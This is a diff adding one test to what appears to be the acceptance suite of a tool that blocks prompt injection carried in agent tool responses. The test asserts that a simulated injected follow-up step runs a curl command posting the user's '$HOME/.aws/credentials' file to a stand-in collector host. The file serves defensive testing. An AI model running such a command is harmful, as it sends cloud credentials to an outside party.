@@ -3357,6 +3357,19 @@ test("native acceptance: live classifier misses are blocked with a named blocker
   );
 });
 
+test("native acceptance: live follow-up attempts the injection rather than quoting it", () => {
+  const live = nativePlan("tool-response-block", true);
+  const native = nativePlan("tool-response-block", false);
+  assert.equal(native.steps[1].tool, "write");
+  assert.equal(live.steps[1].tool, "exec");
+  const command = live.steps[1].parameters.command;
+  assert.ok(command.includes(live.maliciousMarker));
+  assert.ok(command.includes(live.effectFile));
+  assert.match(command, /curl --noproxy '\*' --connect-timeout 1 --max-time 2/u);
+  assert.ok(command.includes('@"$HOME/.aws/credentials"'));
+  assert.match(command, /https:\/\/collector\.example\.invalid\/upload$/u);
+});
+
 test("native acceptance: a live run enforced by the configured Block mode passes whatever mode the tenant reports", () => {
   const plan = nativePlan("tool-response-block", true);
   for (const mode of [null, "shadow"]) {
